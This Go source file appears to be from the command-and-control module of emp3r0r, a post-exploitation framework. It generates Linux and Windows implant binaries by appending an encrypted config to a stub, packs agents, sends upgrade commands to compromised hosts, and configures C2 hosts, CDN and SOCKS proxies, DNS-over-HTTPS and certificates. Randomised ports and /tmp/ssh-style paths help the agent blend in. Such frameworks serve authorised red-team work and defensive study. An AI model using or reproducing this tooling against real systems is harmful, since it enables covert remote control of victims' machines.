package cc

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"strconv"
	"strings"
	"time"

	"github.com/bettercap/readline"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

const (
	CACrtFile     = "ca-cert.pem"
	CAKeyFile     = "ca-key.pem"
	ServerCrtFile = "emp3r0r-cert.pem"
	ServerKeyFile = "emp3r0r-key.pem"
)

func GenAgent() {
	now := time.Now()
	stubFile := EmpBuildDir + "/stub.exe"
	outfile := fmt.Sprintf("%s/agent_%d-%d-%d_%d-%d-%d.exe",
		EmpWorkSpace,
		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())

	os_choice := CliAsk("Generate agent for (1) Linux, (2) Windows: ")
	if os_choice == "2" {
		stubFile = EmpBuildDir + "/stub-win.exe"
		outfile = fmt.Sprintf("%s/agent_windows_%d-%d-%d_%d-%d-%d.exe",
			EmpWorkSpace,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
		CliPrintInfo("You chose Windows")
	}

	if !util.IsFileExist(stubFile) {
		CliPrintError("%s not found, build it first", stubFile)
		return
	}

	// fill emp3r0r.json
	err := PromptForConfig(true)
	if err != nil {
		CliPrintError("Failed to configure agent: %v", err)
		return
	}

	// read file
	jsonBytes, err := ioutil.ReadFile(EmpConfigFile)
	if err != nil {
		CliPrintError("Parsing EmpConfigFile config file: %v", err)
		return
	}

	// encrypt
	key := tun.GenAESKey(emp3r0r_data.MagicString)
	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
	if encJSONBytes == nil {
		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
		return
	}

	// write
	toWrite, err := ioutil.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	sep := []byte(strings.Repeat(emp3r0r_data.MagicString, 3))

	// wrap the config data with magic string
	toWrite = append(toWrite, sep...)
	toWrite = append(toWrite, encJSONBytes...)
	toWrite = append(toWrite, sep...)
	err = ioutil.WriteFile(outfile, toWrite, 0755)
	if err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, EmpConfigFile, outfile)
}

// PackAgentBinary pack agent ELF binary with Packer()
func PackAgentBinary() {
	// completer
	compls := []readline.PrefixCompleterInterface{
		readline.PcItemDynamic(listFiles("./"))}
	CliCompleter.SetChildren(compls)
	defer CliCompleter.SetChildren(CmdCompls)

	// ask
	answ := CliAsk("Path to agent binary: ")

	err := Packer(answ)
	if err != nil {
		CliPrintError("PackAgentBinary: %v", err)
	}
}

func UpgradeAgent() {
	if !util.IsFileExist(WWWRoot + "agent") {
		CliPrintError("Make sure %s/agent exists", WWWRoot)
		return
	}
	checksum := tun.SHA256SumFile(WWWRoot + "agent")
	SendCmdToCurrentTarget(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdUpdateAgent, checksum), "")
}

// PromptForConfig prompt user for emp3r0r config, and write emp3r0r.json
// isAgent: whether we are building a agent binary
func PromptForConfig(isAgent bool) (err error) {
	// read existing config when possible
	var (
		jsonData   []byte
		config_map map[string]interface{}
	)
	if util.IsFileExist(EmpConfigFile) {
		CliPrintInfo("Reading config from existing %s", EmpConfigFile)
		jsonData, err = ioutil.ReadFile(EmpConfigFile)
		if err != nil {
			CliPrintWarning("failed to read %s: %v", EmpConfigFile, err)
		}
		// load to map
		err = json.Unmarshal(jsonData, &config_map)
		if err != nil {
			CliPrintWarning("Parsing existing %s: %v", EmpConfigFile, err)
		}
	}

	// read existing emp3r0r.json
	read_from_cached := func(config_key string, silently_use bool) (val interface{}, err error) {
		// ask
		exists := false
		val, exists = config_map[config_key]
		if !exists {
			err = fmt.Errorf("%s not found in JSON config", config_key)
			return
		}
		if silently_use {
			return
		}
		if CliYesNo(
			fmt.Sprintf("Use cached %s (%s)",
				strconv.Quote(config_key), val)) {
			CliPrintInfo("Using cached '%s' for %s", val, strconv.Quote(config_key))
			return
		}
		return nil, fmt.Errorf("User aborted")
	}

	ask := func(prompt, config_key string) (answer interface{}) {
		val, err := read_from_cached(config_key, false)
		if err != nil {
			CliPrintInfo("Read from cached %s: %v", EmpConfigFile, err)
		} else {
			answer = val
			return
		}

		// ask
		return CliAsk(fmt.Sprintf("%s (%s): ", prompt, config_key))
	}

	// ask a few questions
	// CC names and certs
	var ans string
	if !isAgent {
		ans = fmt.Sprintf("%v",
			ask("CC host(s), can be one or more IPs or domain names, separate with space\n"+
				"NOTE: Only the first host name will be used by agent, the others are ", "cc_host"))
	} else {
		ans = fmt.Sprintf("%v",
			ask("CC host for agent to connect to, can be an IP or a domain name", "cc_host"))
	}
	cc_hosts := strings.Fields(ans)
	RuntimeConfig.CCHost = cc_hosts[0]
	exists := false
	for _, c2_name := range cc_hosts {
		if c2_name == RuntimeConfig.CCHost {
			exists = true
			break
		}
	}
	// if user is requesting a new server name, server cert needs to be re-generated
	if !exists {
		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
			RuntimeConfig.CCHost)
		err = GenC2Certs(cc_hosts)
		if err != nil {
			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
		}
	}

	// if building CC, we can safely ignore varibles below
	if !isAgent {
		return
	}
	if CliYesNo("Enable CDN proxy") {
		RuntimeConfig.CDNProxy = fmt.Sprintf("%v",
			ask("CDN proxy, eg. wss://example.com/ws/path", "cdn_proxy"))
	}
	if CliYesNo("Enable agent proxy (for C2 transport)") {
		RuntimeConfig.AgentProxy = fmt.Sprintf("%v",
			ask("Agent proxy, eg. socks5://127.0.0.1:1080", "agent_proxy"))
	}
	if CliYesNo("Enable DoH (DNS over HTTPS)") {
		RuntimeConfig.DoHServer = fmt.Sprintf("%v",
			ask("DoH server, eg. https://1.1.1.1/dns-query", "doh_server"))
	}
	if !CliYesNo("Enable autoproxy feature (will enable UDP broadcasting)") {
		RuntimeConfig.BroadcastIntervalMax = 0
	}

	// save emp3r0r.json
	return save_config_json()
}

// GenC2Certs generate certificates for CA and emp3r0r C2 server
func GenC2Certs(hosts []string) (err error) {
	if !util.IsFileExist(CAKeyFile) || !util.IsFileExist(CACrtFile) {
		err = tun.GenCerts(nil, "", true)
		if err != nil {
			return fmt.Errorf("Generate CA: %v", err)
		}
	}
	if !util.IsFileExist(CAKeyFile) || !util.IsFileExist(CACrtFile) {
		return fmt.Errorf("%s or %s still not found", CAKeyFile, CACrtFile)
	}

	// generate server cert
	return tun.GenCerts(hosts, "emp3r0r", false)
}

func save_config_json() (err error) {
	err = loadCA()
	if err != nil {
		return fmt.Errorf("save_config_json: %v", err)
	}
	w_data, err := json.Marshal(RuntimeConfig)
	if err != nil {
		return fmt.Errorf("Saving %s: %v", EmpConfigFile, err)
	}
	return ioutil.WriteFile(EmpConfigFile, w_data, 0600)
}

func InitConfigFile(cc_host string) (err error) {
	// random ports
	RuntimeConfig.CCHost = cc_host
	RuntimeConfig.CCPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ProxyPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.BroadcastPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.SSHDPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))

	// random strings
	agent_root := util.RandStr(util.RandInt(6, 20))
	RuntimeConfig.AgentRoot = fmt.Sprintf("/tmp/ssh-%v", agent_root)
	utils_path := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.UtilsPath = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, utils_path)
	socket := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.SocketName = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, socket)
	pid_file := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, pid_file)

	// time intervals
	RuntimeConfig.BroadcastIntervalMin = 30
	RuntimeConfig.BroadcastIntervalMax = 130
	RuntimeConfig.IndicatorWaitMin = 30
	RuntimeConfig.IndicatorWaitMax = 130

	return save_config_json()
}

func loadCA() error {
	// CA cert
	ca_data, err := ioutil.ReadFile(CACrtFile)
	if err != nil {
		return fmt.Errorf("failed to read CA cert: %v", err)
	}
	tun.CACrt = ca_data
	RuntimeConfig.CA = string(tun.CACrt)
	return nil
}
